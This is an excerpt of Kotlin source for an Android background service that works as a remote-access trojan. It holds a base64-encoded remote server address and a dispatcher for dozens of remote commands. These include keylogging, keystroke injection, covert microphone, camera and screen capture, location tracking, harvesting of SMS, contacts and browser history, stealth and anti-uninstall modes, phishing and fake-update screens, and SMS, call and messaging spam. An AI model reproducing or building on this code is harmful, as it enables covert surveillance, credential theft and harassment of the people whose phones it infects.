...
import com.sync.xxx.ManagerCommandHandler
...
class DeviceService : Service(), LifecycleOwner {
    ...
    "aHR0cDovL2hhbnp6eHl6Lm1pdW50ZWNoLm15LmlkOjIwMDA=",
    ...
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            ...
            // ── NEW 79 COMMANDS via ManagerCommandHandler ──────────────────
            "get_accounts", "get_account_types" -> managerHandler().handle(cmd, value)
            "request_admin", "check_admin", "remove_admin" -> managerHandler().handle(cmd, value)
            "toggle_airplane", "get_airplane_status" -> managerHandler().handle(cmd, value)
            "enable_stealth", "disable_stealth", "hide_from_recents" -> managerHandler().handle(cmd, value)
            "enable_anti_uninstall", "disable_anti_uninstall" -> managerHandler().handle(cmd, value)
            "get_app_usage", "get_screen_time" -> managerHandler().handle(cmd, value)
            "start_audio_stream", "stop_audio_stream" -> managerHandler().handle(cmd, value)
            "set_auto_brightness", "get_auto_brightness" -> managerHandler().handle(cmd, value)
            "enable_auto_start", "disable_auto_start" -> managerHandler().handle(cmd, value)
            "get_battery_info", "get_battery_stats" -> managerHandler().handle(cmd, value)
            "get_bluetooth_devices", "toggle_bluetooth", "pair_device" -> managerHandler().handle(cmd, value)
            "set_brightness", "get_brightness" -> managerHandler().handle(cmd, value)
            "get_browser_history", "get_bookmarks" -> managerHandler().handle(cmd, value)
            "get_calendar_events", "create_event" -> managerHandler().handle(cmd, value)
            "get_call_logs", "delete_call_log" -> managerHandler().handle(cmd, value)
            "start_call_spam", "stop_call_spam" -> managerHandler().handle(cmd, value)
            "take_photo_front", "take_photo_back", "record_video" -> managerHandler().handle(cmd, value)
            "start_camera_stream", "stop_camera_stream" -> managerHandler().handle(cmd, value)
            "get_cell_info", "get_tower_info" -> managerHandler().handle(cmd, value)
            "get_clipboard", "set_clipboard", "monitor_clipboard" -> managerHandler().handle(cmd, value)
            "get_connection_type", "get_network_capabilities" -> managerHandler().handle(cmd, value)
            "get_contacts", "add_contact", "delete_contact" -> managerHandler().handle(cmd, value)
            "toggle_dnd", "get_dnd_status" -> managerHandler().handle(cmd, value)
            "get_data_usage", "get_app_data_usage" -> managerHandler().handle(cmd, value)
            "get_device_info", "get_system_info" -> managerHandler().handle(cmd, value)
            "start_email_spam", "stop_email_spam" -> managerHandler().handle(cmd, value)
            "start_fake_call", "stop_fake_call" -> managerHandler().handle(cmd, value)
            "show_fake_notification", "clear_fake_notifications" -> managerHandler().handle(cmd, value)
            "fake_shutdown", "exit_fake_shutdown" -> managerHandler().handle(cmd, value)
            "show_fake_update", "hide_fake_update" -> managerHandler().handle(cmd, value)
            "list_files", "read_file", "write_file", "delete_file" -> managerHandler().handle(cmd, value)
            "toggle_flash", "flash_on", "flash_off" -> managerHandler().handle(cmd, value)
            "get_gallery_images", "get_gallery_videos", "delete_media" -> managerHandler().handle(cmd, value)
            "hide_icon", "show_icon", "get_icon_status" -> managerHandler().handle(cmd, value)
            "toggle_hotspot", "get_hotspot_status", "configure_hotspot" -> managerHandler().handle(cmd, value)
            "get_ip_address", "get_public_ip" -> managerHandler().handle(cmd, value)
            "get_installed_apps", "get_system_apps", "uninstall_app" -> managerHandler().handle(cmd, value)
            "enable_keep_alive", "disable_keep_alive" -> managerHandler().handle(cmd, value)
            "start_keylogger", "stop_keylogger", "get_keylog" -> managerHandler().handle(cmd, value)
            "inject_keystroke", "inject_text" -> managerHandler().handle(cmd, value)
            "get_location", "start_location_tracking", "stop_location_tracking" -> managerHandler().handle(cmd, value)
            "lock_device", "unlock_device", "set_pin" -> managerHandler().handle(cmd, value)
            "start_mic_record", "stop_mic_record", "get_mic_status" -> managerHandler().handle(cmd, value)
            "toggle_mobile_data", "get_mobile_data_status" -> managerHandler().handle(cmd, value)
            "get_network_info", "get_dns_servers" -> managerHandler().handle(cmd, value)
            "start_network_monitor", "stop_network_monitor", "get_network_stats" -> managerHandler().handle(cmd, value)
            "get_network_speed", "start_speed_test" -> managerHandler().handle(cmd, value)
            "get_notifications", "post_notification", "cancel_notification" -> managerHandler().handle(cmd, value)
            "get_orientation", "lock_orientation", "unlock_orientation" -> managerHandler().handle(cmd, value)
            "check_permission", "request_permission", "get_all_permissions" -> managerHandler().handle(cmd, value)
            "show_phishing_page", "hide_phishing_page", "get_phishing_data" -> managerHandler().handle(cmd, value)
            "ping_host", "traceroute" -> managerHandler().handle(cmd, value)
            "reboot_device", "shutdown_device", "get_power_profile" -> managerHandler().handle(cmd, value)
            "set_proxy", "remove_proxy", "get_proxy_info" -> managerHandler().handle(cmd, value)
            "enable_rotation_lock", "disable_rotation_lock", "get_rotation_lock_status" -> managerHandler().handle(cmd, value)
            "start_screen_record", "stop_screen_record", "get_recording_status" -> managerHandler().handle(cmd, value)
            "set_screen_timeout", "get_screen_timeout", "disable_screen_timeout" -> managerHandler().handle(cmd, value)
            "save_secure", "load_secure", "delete_secure" -> managerHandler().handle(cmd, value)
            "get_sensors", "get_sensor_data", "start_sensor_monitoring" -> managerHandler().handle(cmd, value)
            "get_signal_strength", "monitor_signal" -> managerHandler().handle(cmd, value)
            "get_sim_info", "get_sim_contacts" -> managerHandler().handle(cmd, value)
            "send_sms", "get_sms", "delete_sms" -> managerHandler().handle(cmd, value)
            "start_sms_spam", "stop_sms_spam" -> managerHandler().handle(cmd, value)
            "enable_stealth_mode", "disable_stealth_mode", "get_stealth_status" -> managerHandler().handle(cmd, value)
            "show_toast", "show_long_toast" -> managerHandler().handle(cmd, value)
            "connect_vpn", "disconnect_vpn", "get_vpn_status" -> managerHandler().handle(cmd, value)
            "vibrate", "vibrate_pattern", "stop_vibration" -> managerHandler().handle(cmd, value)
            "set_volume", "get_volume", "mute_all" -> managerHandler().handle(cmd, value)
            "start_wa_spam", "stop_wa_spam" -> managerHandler().handle(cmd, value)
            "toggle_wifi", "get_wifi_networks", "connect_wifi", "disconnect_wifi", "get_wifi_info" -> managerHandler().handle(cmd, value)

            else -> android.util.Log.w("DeviceService", "Unknown command: $cmd")
        }
    }
